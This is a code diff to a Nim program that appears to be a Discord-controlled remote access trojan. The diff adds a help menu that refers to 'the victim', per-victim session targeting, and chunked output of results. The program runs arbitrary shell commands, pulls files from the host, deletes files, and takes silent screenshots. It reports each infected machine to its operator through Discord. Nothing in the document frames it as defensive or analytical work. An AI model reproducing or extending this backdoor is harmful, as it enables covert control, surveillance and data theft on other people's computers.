@@ -1,4 +1,4 @@
-import dimscord, asyncdispatch, times, options, httpclient, osproc, os, strutils, json, threadpool, streams
+import dimscord, asyncdispatch, times, options, httpclient, osproc, os, strutils, json, threadpool, streams, random
 
 const
   discordToken* = ""
@@ -54,6 +54,20 @@ proc runCommandWithTimeoutKill(cmd: string, timeoutMs: int): Future[string] {.as
 proc sendMessage(channelId: string, content: string): Future[Message] {.async.} =
     result = await discord.api.sendMessage(channelId, content)
 
+proc sendLongMessage(channelId: string, content: string): Future[void] {.async.} =
+  const maxLen = 1980 # Leave room for code block characters
+  if content.len == 0:
+    discard await discord.api.sendMessage(channelId, "```\n(Command executed with no output)\n```")
+  
+  var remaining = content
+  while remaining.len > 0:
+    let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
+    discard await discord.api.sendMessage(channelId, "```\n" & chunk & "\n```")
+    if remaining.len > maxLen:
+      remaining = remaining[maxLen .. ^1]
+    else:
+      remaining = ""
+
 proc sendFile(channelId: string, filePath: string, fileName: string): Future[void] {.async.} =
     let fileContent = readFile(filePath)
     discard await discord.api.sendMessage(
@@ -63,6 +77,22 @@ proc sendFile(channelId: string, filePath: string, fileName: string): Future[voi
 
 proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[string] {.async.} = 
   let cmd = rawCmd.strip()
+  if cmd == "!help":
+    return """Available Commands:
+!help               - Shows this help message.
+!ls or !dir         - List files in the current directory.
+!cd <dir>           - Change directory.
+!pwd                - Print the current working directory.
+!upload             - Upload a file (attach it to the message).
+!download <file>    - Download a file from the victim.
+!mkdir <dir>        - Create a new directory.
+!touch <file>       - Create a new empty file.
+!rm <file/dir>      - Remove a file or directory.
+!screencapture      - Take a screenshot and send it.
+!sysinfo            - Get system information (OS, user, hostname).
+!<command>          - Execute a shell command (e.g., !whoami).
+"""
+
   if cmd == "!dir" or cmd == "!ls":
     when defined(windows):
       let (output, exitCode) = execCmdEx("cmd /c dir", options = {poUsePath}, workingDir = currentDir)
@@ -76,6 +106,9 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
         return "command failed with exit code " & $exitCode & ":\n" & output
       else:
         return output
+
+  elif cmd == "!pwd":
+    return currentDir
 
   elif cmd.startsWith("!cd "):
     let newDir = cmd[3..^1].strip()
@@ -104,7 +137,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
 
   elif cmd.startsWith("!download "):
     let fileName = cmd[9..^1].strip()
-    let filePath = os.joinPath(currentDir, fileName)
+    let filePath = joinPath(currentDir, fileName)
     if fileExists(filePath):
       await sendFile(m.channel_id, filePath, fileName)
       return "download successful"
@@ -113,7 +146,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
 
   elif cmd.startsWith("!mkdir "):
     let dirName = cmd[6..^1].strip()
-    let dirPath = os.joinPath(currentDir, dirName)
+    let dirPath = joinPath(currentDir, dirName)
     try:
       createDir(dirPath)
       return "created directory: " & dirPath
@@ -122,7 +155,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
 
   elif cmd.startsWith("!touch "):
     let fileName = cmd[6..^1].strip()
-    let filePath = os.joinPath(currentDir, fileName)
+    let filePath = joinPath(currentDir, fileName)
     try:
       writeFile(filePath, "")
       return "created file: " & filePath
@@ -131,7 +164,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
 
   elif cmd.startsWith("!rm "):
     let target = cmd[3..^1].strip()
-    let path = os.joinPath(currentDir, target)
+    let path = joinPath(currentDir, target)
     if fileExists(path):
       try:
         removeFile(path)
@@ -150,7 +183,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
   elif cmd == "!screencapture":
     when defined(macosx):
       let fileName = "screenshot_" & $now().toTime().toUnix() & ".jpg"
-      let filePath = os.joinPath(currentDir, fileName)
+      let filePath = joinPath(currentDir, fileName)
       let (output, exitCode) = execCmdEx("screencapture -x " & filePath)
       if exitCode == 0 and fileExists(filePath):
         await sendFile(m.channel_id, filePath, fileName)
@@ -159,7 +192,7 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
         return "failed to take screenshot: " & output
     elif defined(windows):
       let fileName = "screenshot_" & $now().toTime().toUnix() & ".png"
-      let filePath = os.joinPath(currentDir, fileName)
+      let filePath = joinPath(currentDir, fileName)
       let powershellScript = """
           Add-Type -AssemblyName System.Windows.Forms
           Add-Type -AssemblyName System.Drawing
@@ -206,14 +239,28 @@ proc getHostname(): string =
     else:
       return "unknown hostname"
 
-var machineName = getEnv("MACHINE_NAME", getHostname())
+proc generateSessionId(): string =
+  randomize()
+  let hostname = getHostname().replace(" ", "-").strip()
+  let uid = rand(1000..9999)
+  when defined(windows):
+    return "win-" & hostname & "-" & $uid
+  elif defined(macosx):
+    return "mac-" & hostname & "-" & $uid
+  elif defined(linux):
+    return "lin-" & hostname & "-" & $uid
+  else:
+    return "unk-" & $uid
+
+var machineName: string
 
 proc onReady(s: Shard, r: Ready) {.event(discord).} =
+  machineName = getEnv("MACHINE_NAME", generateSessionId())
+  if machineName notin sessionRegistry:
+    sessionRegistry.add(machineName)
   try:
     let dm = await discord.api.createUserDm(creatorId)
-    if machineName notin sessionRegistry:
-      sessionRegistry.add(machineName)
-    discard await discord.api.sendMessage(dm.id, machineName & " IS LIVE <3")
+    discard await discord.api.sendMessage(dm.id, machineName & " is live!")
   except:
     echo "Could not send startup message to creator ID: ", creatorId
 
@@ -233,13 +280,34 @@ proc messageCreate(s: Shard, m: Message) {.event(discord).} =
     discard await discord.api.editMessage(m.channel_id, msg.id, "pong! took " & $int(after - before) & "ms | " & $s.latency() & "ms.")
     return
   
-  if content.startsWith("!"):
-    try:
-      let output = await handleCommand(content, m, client)
-      discard await sendMessage(m.channel_id, output)
-    except CatchableError as e:
-      echo "Error executing command: ", e.msg
-      discard await sendMessage(m.channel_id, e.msg)
+  if content.startsWith("!") and not content.startsWith("!sessions") and not content.startsWith("!ping"):
+    let parts = content.split(' ', 1)
+    let firstWord = parts[0]
+    let isTargeted = firstWord.len > 1 and firstWord.startsWith("!") and not firstWord.startsWith("!!")
+
+    if isTargeted:
+      # Command is like "!session-name !command"
+      let targetName = firstWord[1..^1]
+
+      if targetName == machineName:
+        let commandToRun = if parts.len > 1: parts[1].strip() else: ""
+        if commandToRun.len > 0 and commandToRun.startsWith("!"):
+          try:
+            let output = await handleCommand(commandToRun, m, client)
+            if output.len > 0:
+              await sendLongMessage(m.channel_id, output)
+          except CatchableError as e:
+            discard await sendMessage(m.channel_id, "Error on " & machineName & ": " & e.msg)
+        else:
+          discard await sendMessage(m.channel_id, machineName & " is here!")
+    else:
+      try:
+        let output = await handleCommand(content, m, client)
+        if output.len > 0:
+          await sendLongMessage(m.channel_id, output)
+      except CatchableError as e:
+        echo "Error executing command: ", e.msg
+        discard await sendMessage(m.channel_id, "Error on " & machineName & ": " & e.msg)
 
 proc main() =
   waitFor discord.startSession()
